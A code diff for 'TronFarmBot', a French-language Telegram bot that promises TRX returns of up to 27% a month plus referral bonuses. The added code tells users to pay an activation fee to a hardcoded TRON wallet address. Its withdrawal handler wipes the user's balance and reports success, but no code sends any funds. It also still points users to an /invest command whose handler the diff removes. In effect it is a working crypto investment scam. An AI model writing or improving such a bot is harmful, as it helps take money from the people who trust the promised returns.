@@ -1,8 +1,8 @@
 import os
 import sqlite3
 import datetime
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram import Update, ReplyKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
 
 # --- Configuration ---
 TOKEN = os.getenv("TOKEN")
@@ -14,6 +14,8 @@ REFERRAL_BONUS = 4
 MIN_WITHDRAWAL = 100
 WITHDRAW_FEE = 10
 INVESTMENT_RETURN = 1.27
+
+TRON_ADDRESS = "TWjPQeufhqoERTCm3yc4GcL78zCj4kgtvV"
 
 # --- Base de données ---
 conn = sqlite3.connect("tronfarm.db", check_same_thread=False)
@@ -43,94 +45,75 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         referrer_id = int(args[0]) if args else None
         c.execute("INSERT INTO users (user_id, referrer_id, balance) VALUES (?, ?, ?)", (user_id, referrer_id, BONUS_WELCOME))
         conn.commit()
+
+    keyboard = [
+        ["💰 Investir", "📊 Mon solde"],
+        ["🔓 Activer mon compte", "💸 Retirer mes gains"]
+    ]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
+    await update.message.reply_text(
+        "💎 Bienvenue sur TronFarmBot !\n\n"
+        "🚀 Investissez vos TRX et récoltez des profits jusqu’à +27% par mois 📈\n"
+        "🎁 Bonus de bienvenue de 5 TRX offert 🎉\n"
+        "🤝 Gagnez 4 TRX pour chaque filleul actif grâce au parrainage 💰\n"
+        "🔒 Simple, rapide, 100% automatisé via la blockchain TRON 🔗\n\n"
+        "🌟 Commencez aujourd’hui et faites travailler votre crypto pour vous ! 🚀",
+        reply_markup=reply_markup
+    )
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text
+
+    if text == "🔓 Activer mon compte":
         await update.message.reply_text(
-            "💎 Bienvenue sur TronFarmBot !\n\n"
-            "🚀 Investissez vos TRX et récoltez des profits jusqu’à +27% par mois 📈\n"
-            "🎁 Bonus de bienvenue de 5 TRX offert 🎉\n"
-            "🤝 Gagnez 4 TRX pour chaque filleul actif grâce au parrainage 💰\n"
-            "🔒 Simple, rapide, 100% automatisé via la blockchain TRON 🔗\n\n"
-            "🌟 Commencez aujourd’hui et faites travailler votre crypto pour vous ! 🚀"
+            f"🔐 Pour activer votre compte, veuillez envoyer {ACTIVATION_FEE} TRX à l'adresse suivante :\n\n"
+            f"{TRON_ADDRESS}\n\n"
+            "Une fois le paiement effectué, votre compte sera activé sous 24h."
         )
-    else:
-        await update.message.reply_text("Vous êtes déjà inscrit sur TronFarmBot !")
 
-async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    c.execute("SELECT activation_paid FROM users WHERE user_id = ?", (user_id,))
-    user = c.fetchone()
+    elif text == "💰 Investir":
+        c.execute("SELECT activation_paid FROM users WHERE user_id = ?", (user_id,))
+        user = c.fetchone()
+        if not user or not user[0]:
+            await update.message.reply_text("⚠ Vous devez d'abord activer votre compte avant d'investir.")
+            return
+        await update.message.reply_text("Veuillez utiliser la commande /invest montant pour investir.")
 
-    if user and user[0]:
-        await update.message.reply_text("Votre compte est déjà activé.")
-        return
+    elif text == "📊 Mon solde":
+        c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
+        user = c.fetchone()
+        if user:
+            await update.message.reply_text(f"Votre solde est de {user[0]} TRX.")
+        else:
+            await update.message.reply_text("Veuillez d'abord vous inscrire avec /start")
 
-    c.execute("UPDATE users SET activation_paid = 1, activation_date = ? WHERE user_id = ?", (str(datetime.date.today()), user_id))
-    conn.commit()
+    elif text == "💸 Retirer mes gains":
+        c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
+        user = c.fetchone()
 
-    c.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
-    ref = c.fetchone()[0]
-    if ref:
-        c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (REFERRAL_BONUS, ref))
+        if not user:
+            await update.message.reply_text("Veuillez d'abord vous inscrire.")
+            return
+
+        balance = user[0]
+        if balance < MIN_WITHDRAWAL:
+            await update.message.reply_text(f"Montant insuffisant. Minimum de retrait: {MIN_WITHDRAWAL} TRX.")
+            return
+
+        withdraw_amount = balance - WITHDRAW_FEE
+        c.execute("UPDATE users SET balance = 0 WHERE user_id = ?", (user_id,))
         conn.commit()
 
-    await update.message.reply_text("Activation réussie ! Vous pouvez maintenant investir.")
-
-async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    c.execute("SELECT activation_paid FROM users WHERE user_id = ?", (user_id,))
-    user = c.fetchone()
-
-    if not user or not user[0]:
-        await update.message.reply_text("Vous devez d'abord activer votre compte.")
-        return
-
-    try:
-        amount = float(context.args[0])
-        profit = round(amount * INVESTMENT_RETURN, 2)
-        c.execute("UPDATE users SET invested = invested + ?, balance = balance + ? WHERE user_id = ?", (amount, profit, user_id))
-        conn.commit()
-        await update.message.reply_text(f"Investissement de {amount} TRX enregistré. Vous recevrez {profit} TRX après 30 jours.")
-    except:
-        await update.message.reply_text("Utilisation : /invest montant")
-
-async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
-    user = c.fetchone()
-
-    if user:
-        await update.message.reply_text(f"Votre solde est de {user[0]} TRX.")
-    else:
-        await update.message.reply_text("Veuillez d'abord vous inscrire avec /start")
-
-async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
-    user = c.fetchone()
-
-    if not user:
-        await update.message.reply_text("Veuillez d'abord vous inscrire.")
-        return
-
-    balance = user[0]
-    if balance < MIN_WITHDRAWAL:
-        await update.message.reply_text(f"Montant insuffisant. Minimum de retrait: {MIN_WITHDRAWAL} TRX.")
-        return
-
-    withdraw_amount = balance - WITHDRAW_FEE
-    c.execute("UPDATE users SET balance = 0 WHERE user_id = ?", (user_id,))
-    conn.commit()
-
-    await update.message.reply_text(f"Retrait de {withdraw_amount} TRX validé après déduction des frais de {WITHDRAW_FEE} TRX.")
+        await update.message.reply_text(f"Retrait de {withdraw_amount} TRX validé après déduction des frais de {WITHDRAW_FEE} TRX.")
 
 # --- Lancement du bot Telegram avec Webhook ---
 
 app = ApplicationBuilder().token(TOKEN).build()
 
 app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("activate", activate))
-app.add_handler(CommandHandler("invest", invest))
-app.add_handler(CommandHandler("balance", balance))
-app.add_handler(CommandHandler("withdraw", withdraw))
+app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
 print("Bot en cours de fonctionnement avec Webhook...")
 
